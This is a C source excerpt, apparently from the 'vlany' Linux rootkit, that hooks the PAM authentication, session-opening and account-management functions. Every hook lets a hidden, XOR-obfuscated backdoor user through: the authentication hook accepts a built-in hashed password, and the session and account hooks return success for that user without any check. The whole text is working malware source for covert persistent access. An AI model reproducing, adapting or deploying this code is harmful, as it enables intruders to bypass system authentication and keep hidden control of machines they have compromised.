int pam_authenticate(pam_handle_t *pamh, int flags)
{
    #ifdef PAM_DEBUG
        printf("[vlany] pam_authenticate() called\n");
    #endif

    void *user;

    HOOK(old_pam_authenticate, CPAM_AUTHENTICATE);
    pam_get_item(pamh, PAM_USER, (const void **)&user);

    if((char *)user == NULL) return old_pam_authenticate(pamh, flags);

    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);

    if(!strcmp((char *)user, vlany_user))
    {
        if(!strcmp(procname_self(), "login")) { CLEAN(vlany_user); return old_pam_authenticate(pamh, flags); }

        char prompt[512], *pw;
        snprintf(prompt, sizeof(prompt), "* Password for %s: ", vlany_user);

        pam_prompt(pamh, 1, &pw, "%s", prompt);

        char *vlany_password = strdup(VLANY_PASSWORD); xor(vlany_password);

        if(!strcmp(crypt(pw, vlany_password), vlany_password)) { CLEAN(vlany_user); CLEAN(vlany_password); return PAM_SUCCESS; }

        CLEAN(vlany_user);
        CLEAN(vlany_password);

        return PAM_USER_UNKNOWN;
    }

    CLEAN(vlany_user);
    return old_pam_authenticate(pamh, flags);
}

int pam_open_session(pam_handle_t *pamh, int flags)
{
    #ifdef PAM_DEBUG
        printf("[vlany] pam_open_session() called\n");
    #endif

    HOOK(old_pam_open_session, CPAM_OPEN_SESSION);

    void *user;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return old_pam_open_session(pamh, flags);

    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    if(!strcmp(user, vlany_user)) { CLEAN(vlany_user); return PAM_SUCCESS; }
    CLEAN(vlany_user);

    return old_pam_open_session(pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
    #ifdef PAM_DEBUG
        printf("[vlany] pam_acct_mgmt() called\n");
    #endif

    HOOK(old_pam_acct_mgmt, CPAM_ACCT_MGMT);

    void *user;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return old_pam_acct_mgmt(pamh, flags);

    char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
    if(!strcmp(user, vlany_user)) { CLEAN(vlany_user); return PAM_SUCCESS; }
    CLEAN(vlany_user);

    return old_pam_acct_mgmt(pamh, flags);
}
